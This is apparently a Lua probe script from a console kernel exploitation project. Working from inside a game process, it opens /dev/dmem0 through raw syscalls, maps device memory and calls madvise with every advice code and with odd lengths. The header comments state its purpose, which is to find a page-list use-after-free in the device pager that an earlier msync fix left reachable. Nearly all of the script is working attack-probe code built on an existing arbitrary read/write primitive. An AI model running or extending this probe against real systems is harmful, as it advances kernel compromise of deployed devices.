-- CRASH_CLASS: MODERATE
-- PROBE 1440a: madvise on a /dev/dmem0 mapping -- does it drop device pages?
--
-- CVE-2026-49418 is a page-list use-after-free in the device pager, and this
-- project closed it because msync(MS_INVALIDATE) is refused before reaching
-- vm_object_page_remove on every mapping a game process can create
-- (docs/MSYNC_CVE_2026_49418.md, 58a/58b).  msync is not the only syscall that
-- removes pages from a vm_object.  mmap(477) of /dev/dmem0 is a device-pager
-- mapping (the driver answers d_mmap and the kernel backs it with a dev pager
-- object), and madvise is accepted on mappings where msync is refused.
--
-- The question this probe answers is narrow and mechanical: for each advice code,
-- does the page behind a live device mapping get dropped, and what does the
-- caller see afterwards?
--
--   marker survives          -> the advice was ignored for device pages
--   marker becomes zero      -> the page was dropped and a fresh zero page was
--                               installed; reachability of the free path confirmed
--   marker becomes other data-> the page was reused while the mapping still
--                               pointed at it, which is the UAF this is looking for
--
-- Prior art:
--   58a/58b   results/ phase-of-msync (msync MS_INVALIDATE refused everywhere)
--   1396b     results/phase36_realargs/1396b_dev_map_writable_20261109_142603.txt
--   1397b     results/phase36_realargs/1397b_dmem_offset_ladder_20261109_142645.txt
--   1414a     results/phase36_realargs/1414a_dmem_read_write_20261109_153451.txt
--   docs/DMEM_WINDOW_14_10.md
--   docs/MSYNC_CVE_2026_49418.md

print("=== PROBE 1440a: MADVISE ON A DEVICE MAPPING ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function sc(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function es()
    local ok, s = pcall(function() return get_error_string() end)
    if ok and type(s) == "string" then return s end
    return "errno?"
end
local function wr(p, v) pcall(function() memory.write_dword(p, v) end) end
local function rd(p)
    local ok, v = pcall(function() return to_num(memory.read_dword(p)) end)
    if ok then return v end
    return nil
end
local function str_addr(s)
    local p = memory.alloc(#s + 1)
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    memory.write_byte(p + #s, 0)
    return p
end

local m5, m477, m75, m73, m74 = sc(5), sc(477), sc(75), sc(73), sc(74)
local fd = to_num(m5(uint64(str_addr("/dev/dmem0")), uint64(0x4002), uint64(0)))
print(string.format("open(/dev/dmem0) -> %d", fd))

local LEN = 0x40000            -- 64 pages
local OFF = 0x10000000         -- a rung 1397e showed is ordinary writable memory
local function map(off, len, prot, flags)
    local ok, r = pcall(function()
        return m477(uint64(0), uint64(len), uint64(prot or 3), uint64(flags or 1),
            uint64(fd), uint64(off))
    end)
    if not ok then return nil end
    local v = to_num(r)
    if v < 0x10000 or v > 0x8000000000 then return nil end
    return v
end

local va = map(OFF, LEN, 3, 1)
print(string.format("mmap(off %#x, len %#x, prot 3) -> %s", OFF, LEN,
    va and string.format("%#x", va) or "FAILED"))
if not va then
    print("no mapping; nothing to test")
    print("")
    print("=== PROBE 1440a COMPLETE ===")
    return
end

-- instantiate and tag every page
local ok_fault = true
for p = 0, 63 do
    wr(va + p * 0x1000 + 0x10, 0xDEAD0000 + p)
end
local bad = 0
for p = 0, 63 do
    if rd(va + p * 0x1000 + 0x10) ~= 0xDEAD0000 + p then bad = bad + 1 end
end
print(string.format("[A] wrote and verified 64 page markers, mismatches=%d", bad))
print("")

local names = {
    [0] = "NORMAL", [1] = "RANDOM", [2] = "SEQUENTIAL", [3] = "WILLNEED",
    [4] = "DONTNEED", [5] = "FREE", [6] = "NOCORE", [7] = "AUTOSYNC",
    [8] = "NOSYNC",
}

print("[B] one advice at a time on the first 4 pages")
for adv = 0, 8 do
    -- retag the four pages so each advice starts from a known state
    for p = 0, 3 do wr(va + p * 0x1000 + 0x10, 0xCAFE0000 + p) end
    local before = {}
    for p = 0, 3 do before[p] = rd(va + p * 0x1000 + 0x10) end
    local rv = "EXC"
    local ok, r = pcall(function()
        return m75(uint64(va), uint64(0x4000), uint64(adv))
    end)
    if ok then rv = to_num(r) end
    local e = es()
    local after, changed, zeroed = {}, 0, 0
    for p = 0, 3 do
        after[p] = rd(va + p * 0x1000 + 0x10)
        if after[p] ~= before[p] then
            changed = changed + 1
            if after[p] == 0 then zeroed = zeroed + 1 end
        end
    end
    print(string.format("  madvise %-10s(%d) rv=%-5s (%-22s) changed=%d zeroed=%d  p0 %s -> %s",
        names[adv] or "?", adv, tostring(rv), e, changed, zeroed,
        before[0] and string.format("%08X", before[0]) or "nil",
        after[0] and string.format("%08X", after[0]) or "nil"))
end
print("")

print("[C] does the device content come back, or a fresh zero page?")
-- write a value that cannot come from GPU memory, drop, then re-read
local probe_page = va + 8 * 0x1000
wr(probe_page + 0x10, 0x5EED5EED)
print(string.format("  wrote 5EED5EED, read %08X", rd(probe_page + 0x10) or 0))
local rv = "EXC"
local ok, r = pcall(function() return m75(uint64(probe_page), uint64(0x1000), uint64(4)) end)
if ok then rv = to_num(r) end
print(string.format("  madvise(DONTNEED) on that page -> %s (%s)", tostring(rv), es()))
print(string.format("  read back %08X", rd(probe_page + 0x10) or 0))
-- and through a second, independent mapping of the same offset
local va2 = map(OFF, LEN, 3, 1)
if va2 then
    print(string.format("  second mapping %#x reads %08X", va2, rd(va2 + 8 * 0x1000 + 0x10) or 0))
else
    print("  second mapping FAILED")
end
print("")

print("[D] whole-mapping DONTNEED, then a full re-read")
for p = 0, 63 do wr(va + p * 0x1000 + 0x20, 0xBEEF0000 + p) end
local rv2 = "EXC"
local ok2, r2 = pcall(function() return m75(uint64(va), uint64(LEN), uint64(4)) end)
if ok2 then rv2 = to_num(r2) end
print(string.format("  madvise(DONTNEED, whole %#x) -> %s (%s)", LEN, tostring(rv2), es()))
local miss, zero, other = 0, 0, 0
for p = 0, 63 do
    local v = rd(va + p * 0x1000 + 0x20)
    if v == 0xBEEF0000 + p then
        miss = miss + 1
    elseif v == 0 then
        zero = zero + 1
    else
        other = other + 1
        if other <= 4 then
            print(string.format("    page %2d: %08X (was %08X)", p, v or 0, 0xBEEF0000 + p))
        end
    end
end
print(string.format("  intact=%d zeroed=%d other=%d", miss, zero, other))
print("")

print("[E] smaller-than-page advice, the shape that trips page-list code")
for _, alen in ipairs({1, 0x10, 0xFFF, 0x1001, 0x2000}) do
    wr(va + 0x10, 0x1234ABCD)
    local a = "EXC"
    local o, rr = pcall(function() return m75(uint64(va), uint64(alen), uint64(4)) end)
    if o then a = to_num(rr) end
    print(string.format("  len=%#06x DONTNEED -> %-5s (%s) dword=%08X",
        alen, tostring(a), es(), rd(va + 0x10) or 0))
end
print("")

print("[F] survivor check")
print(string.format("  read page 0 marker %08X", rd(va + 0x10) or 0))

print("")
print("=== PROBE 1440a COMPLETE ===")
